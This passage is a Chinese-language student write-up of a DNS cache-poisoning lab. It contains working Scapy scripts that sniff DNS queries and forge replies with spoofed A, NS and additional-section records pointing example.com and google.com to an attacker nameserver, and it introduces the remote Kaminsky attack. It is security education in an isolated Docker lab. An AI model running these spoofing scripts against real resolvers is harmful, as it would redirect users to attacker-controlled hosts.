pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))  </span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">    NSsec = DNSRR(rrname=<span class="string">&#x27;example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)             </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,</span><br><span class="line">                  ancount=<span class="number">1</span>, nscount=<span class="number">1</span>, an=Anssec, ns=NSsec )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53)&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure>
<p>运行代码：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701760034492-3ddc2be5-ca88-429b-b5bc-061245c7cca3.png#averageHue=%23232222&clientId=uec501cad-8b7d-4&from=paste&height=190&id=u4d145dc0&originHeight=300&originWidth=664&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=20529&status=done&style=none&taskId=u5fb790b4-52bd-455b-8522-87e92046dd1&title=&width=421.587320732873" alt="image.png"><br />user发起一次查询，成功实现欺骗<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701760008843-c47a398d-6795-431a-8e53-4468e4cb4ede.png#averageHue=%23252322&clientId=uec501cad-8b7d-4&from=paste&height=406&id=uf9101896&originHeight=639&originWidth=964&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=69474&status=done&style=none&taskId=uc275bfe0-c62b-4b04-9f9d-5c910735233&title=&width=612.063519859171" alt="image.png"><br />将cache dump下来并保存到文件中，因为容器中没有vim，所以我们在对应目录用直接用cat查看里面的内容<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701760378640-b5b13867-e9c8-452a-9fd1-d599cff96972.png#averageHue=%23282524&clientId=uec501cad-8b7d-4&from=paste&height=231&id=u5bd9ac75&originHeight=364&originWidth=977&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=61708&status=done&style=none&taskId=ucd54e3bc-97bd-4e21-a5ec-42fc0127683&title=&width=620.3174884879774" alt="image.png"><br />发现cache被改变，投毒成功：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701760331332-364b1ff6-ee73-4a96-b8db-0eb34ae4b9cf.png#averageHue=%23252322&clientId=uec501cad-8b7d-4&from=paste&height=389&id=u94e5f197&originHeight=612&originWidth=1246&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=91059&status=done&style=none&taskId=uc68978c3-aed6-4534-a67c-69f1cbbb53d&title=&width=791.1111470378912" alt="image.png"><br><a name="cey1t"></a></p>
<h4 id="Task-3-Spoofing-NS-Records"><a href="#Task-3-Spoofing-NS-Records" class="headerlink" title="Task 3: Spoofing NS Records"></a><strong>Task 3: Spoofing NS Records</strong></h4><blockquote>
<p>进一步修改task2代码，实现NS记录的欺骗，以达成<strong>任何example.com</strong>的子域名dns请求都会返回被某恶意权威域名服务器的控制的结果。</p>
</blockquote>
<p>编写spoof_ns.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> <span class="string">&#x27;www.example.com&#x27;</span> <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))  </span><br><span class="line">    </span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">    NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">    NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns1.attacker32.com&#x27;</span>)</span><br><span class="line">                   </span><br><span class="line">    <span class="comment"># The Additional Section</span></span><br><span class="line">    <span class="comment"># Addsec = DNSRR(rrname=&#x27;ns1.example.net&#x27;, type=&#x27;A&#x27;, ttl=259200, rdata=&#x27;1.2.3.4&#x27;)                </span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,</span><br><span class="line">                  ancount=<span class="number">1</span>, nscount=<span class="number">2</span>, arcount=<span class="number">2</span>, an=Anssec, ns=NSsec )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and dst port 53&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701761274307-63a38f56-15cc-4ac5-b1a6-c43fb28ae475.png#averageHue=%232b2423&clientId=uec501cad-8b7d-4&from=paste&height=192&id=u82c48132&originHeight=303&originWidth=970&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=18771&status=done&style=none&taskId=u3a38630f-b767-4acc-835b-ae870c636c2&title=&width=615.873043841697" alt="95a8ccba696fa1608c8367aad452ab1e.png"><br /><strong>给local dns server清除缓存！</strong><br />attacker运行代码，user仍旧通过<a target="_blank" rel="noopener" href="http://www.example.com查询/">www.example.com查询</a><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701761651778-9bbef2a6-6106-4816-8525-8e5cf317a401.png#averageHue=%23252120&clientId=uec501cad-8b7d-4&from=paste&height=136&id=ud1938e44&originHeight=187&originWidth=623&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=7675&status=done&style=none&taskId=u0ddadb42-e576-4a0d-a832-66765992a26&title=&width=454.5555725097656" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701761610188-33e35293-c635-4487-9d9f-6d6822477610.png#averageHue=%23232120&clientId=uec501cad-8b7d-4&from=paste&height=311&id=uf50af3de&originHeight=543&originWidth=894&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=34725&status=done&style=none&taskId=u40668d60-5532-4e0d-acac-b2f99f32c27&title=&width=512.6190795898438" alt="image.png"><br />结束代码运行，测试其他子域名：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701761771777-6e4bbfb6-0988-4d02-a6c3-d9bf7f5f6d52.png#averageHue=%23242120&clientId=uec501cad-8b7d-4&from=paste&height=340&id=u3027d076&originHeight=536&originWidth=841&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=36310&status=done&style=none&taskId=u1fc9620c-4ec6-4585-9be2-093171cfb78&title=&width=533.9682782173888" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762312323-ce85fd4c-89ea-4e27-9039-8909a50261f3.png#averageHue=%23232120&clientId=uec501cad-8b7d-4&from=paste&height=345&id=u9218fea8&originHeight=543&originWidth=918&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=37054&status=done&style=none&taskId=u7c19bf8e-1aee-449f-af0f-cf173512535&title=&width=582.857169326472" alt="image.png"><br />将local DNS server的缓存保存到文件中：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762611780-54fa230c-2ec3-4a4c-a533-7ef531d55ebd.png#averageHue=%232d2a26&clientId=uec501cad-8b7d-4&from=paste&height=59&id=u6316bc93&originHeight=93&originWidth=762&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=12414&status=done&style=none&taskId=u55bc83c1-4283-4107-9be9-e4d343f0c39&title=&width=483.80954578079707" alt="image.png"><br />被修改的ns记录：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762510721-6c947842-c77d-4e57-81be-6b580a1c9781.png#averageHue=%23242120&clientId=uec501cad-8b7d-4&from=paste&height=387&id=u9aab3c95&originHeight=610&originWidth=1075&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=54463&status=done&style=none&taskId=u5536a6bd-7e23-430b-a470-46e01159bac&title=&width=682.5397135359013" alt="image.png"><br />刚刚查询的example.com域名：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762565075-3c85cc24-643e-4b1f-84a4-73dceac943b9.png#averageHue=%23252120&clientId=uec501cad-8b7d-4&from=paste&height=211&id=u9f63c411&originHeight=333&originWidth=696&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=19290&status=done&style=none&taskId=u4dd3c0b5-b3a6-4a65-ae55-d40f064378d&title=&width=441.9047819730115" alt="image.png"><br><a name="CSNpP"></a></p>
<h4 id="Task-4-Spoofing-NS-Records-for-Another-Domain"><a href="#Task-4-Spoofing-NS-Records-for-Another-Domain" class="headerlink" title="Task 4: Spoofing NS Records for Another Domain"></a><strong>Task 4: Spoofing NS Records for Another Domain</strong></h4><blockquote>
<p>在之前的攻击中，我们成功地毒害了本地DNS服务器的缓存，因此ns.attacker32.com成为了example.com域的命名服务器。受到这次成功的启发，我们希望将其影响扩展到其他领域。也就是说，在由<a target="_blank" rel="noopener" href="http://www.example.com查询触发的欺骗响应中,我们想在www.example.com部分中添加额外的条目/">www.example.com查询触发的欺骗响应中，我们想在www.example.com部分中添加额外的条目</a>, ns.attacker32.com也被用作google.com的命名服务器。</p>
</blockquote>
<p>编写spoof_ns_anotherdomian.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">NS_NAME = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))  </span><br><span class="line">    </span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)                </span><br><span class="line">    NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">    NSsec1 = DNSRR(rrname=<span class="string">&#x27;google.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">    <span class="comment"># NSsec3 = DNSRR(rrname=&#x27;google.example.com&#x27;, type=&#x27;NS&#x27;, ttl=259200, rdata=&#x27;ns.attacker32.com&#x27;)</span></span><br><span class="line">    <span class="comment"># NSsec4 = DNSRR(rrname=&#x27;example.com&#x27;, type=&#x27;NS&#x27;, ttl=259200, rdata=&#x27;ns1.attacker32.com&#x27;)</span></span><br><span class="line">                   </span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,</span><br><span class="line">                ancount=<span class="number">1</span>, nscount=<span class="number">2</span>,  an=Anssec, ns=NSsec1/NSsec2 )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)      </span><br></pre></td></tr></table></figure>
<p>运行代码：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701845896387-e6cee411-4952-4be0-a6e1-7c2b57f9a806.png#averageHue=%23212020&clientId=u85c33050-56c9-4&from=paste&height=126&id=ud0fc1d50&originHeight=199&originWidth=619&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=8547&status=done&style=none&taskId=u16c33a70-266c-4d2e-ab3a-cdbcb4bba91&title=&width=393.0158908639283" alt="image.png"><br />user端对网址进行dig<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701845937036-46be0543-31d9-4056-a085-75ac31df958a.png#averageHue=%23222120&clientId=u85c33050-56c9-4&from=paste&height=337&id=ud476d2ce&originHeight=530&originWidth=794&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=36374&status=done&style=none&taskId=u39d8f65a-05dd-4f79-b4b3-6c47fbe5b4b&title=&width=504.1270070209355" alt="image.png"><br />将local DNS server的缓存保存到文件中：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701762611780-54fa230c-2ec3-4a4c-a533-7ef531d55ebd.png#averageHue=%232d2a26&clientId=uec501cad-8b7d-4&from=paste&height=59&id=kKmiN&originHeight=93&originWidth=762&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=12414&status=done&style=none&taskId=u55bc83c1-4283-4107-9be9-e4d343f0c39&title=&width=483.80954578079707" alt="image.png"><br />被修改的ns记录：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701921323580-9d70b5b5-50f6-4f41-bbf5-b1a6193c38e2.png#averageHue=%23242221&clientId=ubcecf621-0b99-4&from=paste&height=400&id=u7b42d6d3&originHeight=630&originWidth=867&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=49606&status=done&style=none&taskId=u8b1c40e4-cf8e-431b-869b-7fe9a232af7&title=&width=550.4762154750014" alt="image.png"><br><a name="esyPc"></a></p>
<h4 id="Task-5-Spoofing-Records-in-the-Additional-Section"><a href="#Task-5-Spoofing-Records-in-the-Additional-Section" class="headerlink" title="**Task 5: Spoofing Records in the Additional Section **"></a>**Task 5: Spoofing Records in the Additional Section **</h4><p>按照要求修改攻击代码task5.py构造部分如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">NS_NAME = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof_dns</span>(<span class="params">pkt</span>):</span><br><span class="line">  <span class="keyword">if</span> (DNS <span class="keyword">in</span> pkt <span class="keyword">and</span> NS_NAME <span class="keyword">in</span> pkt[DNS].qd.qname.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">    <span class="built_in">print</span>(pkt.sprintf(<span class="string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))  </span><br><span class="line">    </span><br><span class="line">    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)</span><br><span class="line">    UDPpkt = UDP(dport=pkt[UDP].sport, sport=<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>)                </span><br><span class="line">    NSsec1 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.attacker32.com&#x27;</span>)</span><br><span class="line">    NSsec2 = DNSRR(rrname=<span class="string">&#x27;example.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;NS&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;ns.example.com&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    Addsec1 = DNSRR(rrname=<span class="string">&#x27;ns.attacker32.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;1.2.3.4&#x27;</span>) </span><br><span class="line">    Addsec2 = DNSRR(rrname=<span class="string">&#x27;ns.example.net&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;5.6.7.8&#x27;</span>)</span><br><span class="line">    Addsec3 = DNSRR(rrname=<span class="string">&#x27;www.facebook.com&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;A&#x27;</span>, ttl=<span class="number">259200</span>, rdata=<span class="string">&#x27;3.4.5.6&#x27;</span>)</span><br><span class="line">                   </span><br><span class="line">    <span class="comment"># Construct the DNS packet</span></span><br><span class="line">    DNSpkt = DNS(<span class="built_in">id</span>=pkt[DNS].<span class="built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="number">1</span>, rd=<span class="number">0</span>, qr=<span class="number">1</span>, qdcount=<span class="number">1</span>,ancount=<span class="number">1</span>, </span><br><span class="line">        nscount=<span class="number">2</span>, arcount=<span class="number">3</span>, an=Anssec, ns=NSsec1/NSsec2, ar= Addsec1/Addsec2/Addsec3)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the entire IP packet and send it out</span></span><br><span class="line">    spoofpkt = IPpkt/UDPpkt/DNSpkt</span><br><span class="line">    send(spoofpkt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sniff UDP query packets and invoke spoof_dns().</span></span><br><span class="line">f = <span class="string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span></span><br><span class="line">pkt = sniff(iface=<span class="string">&#x27;br-ace020efb37f&#x27;</span>, <span class="built_in">filter</span>=f, prn=spoof_dns)</span><br></pre></td></tr></table></figure>

<p>清除缓存，Attacker运行代码，user端 dig <a target="_blank" rel="noopener" href="http://www.example.com./">www.example.com。</a><br />不知道为什么，发现google的缓存清除不掉：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701927553258-3db6b7ed-e81a-4335-8156-2ee8609c40f1.png#averageHue=%23222120&clientId=ubcecf621-0b99-4&from=paste&height=428&id=u114d76bf&originHeight=815&originWidth=879&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=62469&status=done&style=none&taskId=uce9d3aa3-09f4-461c-808c-c500658a750&title=&width=462.09527587890625" alt="image.png"></p>
<p><a name="vTOH6"></a></p>
<h2 id="3-DNS-Remote"><a href="#3-DNS-Remote" class="headerlink" title="3 DNS_Remote"></a><strong>3 DNS_Remote</strong></h2><p><a name="eI7z2"></a></p>
<h3 id="3-1-环境搭建"><a href="#3-1-环境搭建" class="headerlink" title="3.1 环境搭建"></a>3.1 环境搭建</h3><p>DNS缓存中毒攻击的主要目标是本地DNS服务器。显然，攻击一个真正的服务器是非法的，所以我们需要设置我们自己的DNS服务器来进行攻击实验。实验室环境需要四个独立的机器：一个用于受害者，一个用于DNS服务器，两个用于攻击者。实验室环境设置如图1所示。DNS缓存中毒攻击的主要目标是本地DNS服务器。显然，攻击一个真正的服务器是非法的，所以我们需要设置我们自己的DNS服务器来进行攻击实验。实验室环境需要四个独立的机器：一个用于受害者，一个用于DNS服务器，两个用于攻击者。实验室环境设置如图1所示：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701928444976-96b4d049-6cef-484c-9ff6-64732527f6d8.png#averageHue=%23f1f1f1&clientId=ubcecf621-0b99-4&from=paste&height=333&id=u34e1354c&originHeight=525&originWidth=1315&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=133026&status=done&style=none&taskId=u28c76942-4239-432d-b34d-a7050b93232&title=&width=834.9206728369397" alt="image.png"></p>
<p>主要欺骗目标为<a target="_blank" rel="noopener" href="http://www.example.com,该域名真实ip为93.184.216.34,由icann管理/">www.example.com,该域名真实ip为93.184.216.34，由ICANN管理</a></p>
<p>停止原来的docker：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702100211362-99ba3a31-ca7d-4afe-86e7-996e029619e0.png#averageHue=%23100e0c&clientId=u47a7314e-7035-4&from=paste&height=231&id=u3efc5535&originHeight=364&originWidth=1056&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=84501&status=done&style=none&taskId=ud2e8b0a3-37e7-4735-b3bd-a13fcccac48&title=&width=670.4762209245691" alt="image.png"><br />在新的目录下重新启动docker:<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702100415014-7915ab1a-ac71-45e6-adf2-1ab1229de642.png#averageHue=%230d0b09&clientId=u47a7314e-7035-4&from=paste&height=420&id=u1bd6f4d2&originHeight=662&originWidth=1054&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=158851&status=done&style=none&taskId=ufc8263df-ffbb-449f-b449-cccd3800d49&title=&width=669.2063795970605" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702100788107-8f2f22a6-79a7-4d7c-bd72-2efa475a623a.png#averageHue=%23100f0e&clientId=u47a7314e-7035-4&from=paste&height=134&id=RiBg6&originHeight=211&originWidth=1053&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=49240&status=done&style=none&taskId=u63deb200-e1f9-49c5-acb4-a21d35a7eb8&title=&width=668.5714589333062" alt="image.png"><br><a name="EsBYy"></a></p>
<h3 id="3-2-The-Attack-Tasks"><a href="#3-2-The-Attack-Tasks" class="headerlink" title="3.2 The Attack Tasks"></a>3.2 The Attack Tasks</h3><p><a name="Aeoki"></a></p>
<h4 id="Task-1-The-Kaminsky-Attack"><a href="#Task-1-The-Kaminsky-Attack" class="headerlink" title="Task 1:The Kaminsky Attack"></a>Task 1:The Kaminsky Attack</h4><p> 前述已经完成在同一LAN下的DNS攻击，在同一个LAN下是可以直接看到query包。远程攻击缓存投毒的困难主要在于，响应包的事务id必须与请求包相匹配，而请求包的id通常是随机生成的，不在同一子网无法捕捉包看id，而自己暴力手段猜测id会败在缓存机制下，因为当我们成功之前，正确包已经到达被缓存，在time out 之前，dns server不会再向外查询。</p>
<p>Kaminsky提出的方案（主动构造对应域名的requests，同时大量不同id响应包响应dns server的请求以欺骗完成缓存中毒攻击）<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1701929639629-2be29c93-8716-49e1-a081-28504850b3d2.png#averageHue=%23dfdfde&clientId=ubcecf621-0b99-4&from=paste&height=493&id=u0f2f3ce7&originHeight=777&originWidth=1480&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=162074&status=done&style=none&taskId=u8f1a9462-7f89-43d7-b694-bbcd5286188&title=&width=939.6825823564037" alt="image.png"><br />然而，上述假设的攻击忽略了缓存效应。实际上，如果攻击者没有足够幸运地在真正的响应包到达之前做出正确的猜测，那么正确的信息将被DNS服务器缓存一段时间。这种缓存效应使得攻击者无法就相同名称建立另一个响应，因为在缓存超时之前，DNS服务器不会发送该名称的另一个DNS查询。要对同一名称建立另一个响应，攻击者必须等待对该名称的另一个DNS查询，这意味着他&#x2F;她必须等待缓存超时。等待时间可以是数小时或天。<br><a name="uCMeX"></a></p>
<h4 id="Task-2-Construct-DNS-request"><a href="#Task-2-Construct-DNS-request" class="headerlink" title="Task 2: Construct DNS request"></a>Task 2: Construct DNS request</h4><blockquote>
<p>此任务主要于发送DNS请求。为了完成攻击，攻击者需要触发目标DNS服务器发送DNS查询，这样他们就有机会欺骗DNS应答。由于攻击者需要多次尝试才能成功，所以最好使用一个程序来自动化这个过程。<br>学生需要编写一个程序来将DNS查询发送到目标DNS服务器（即，在我们的设置中的本地DNS服务器）。学生们的工作是编写这个程序，并演示（使用Wireshark），他们的查询可以触发目标DNS服务器发送相应的DNS查询。</p>
</blockquote>
<p>编写gen_dns_request.py：</p>
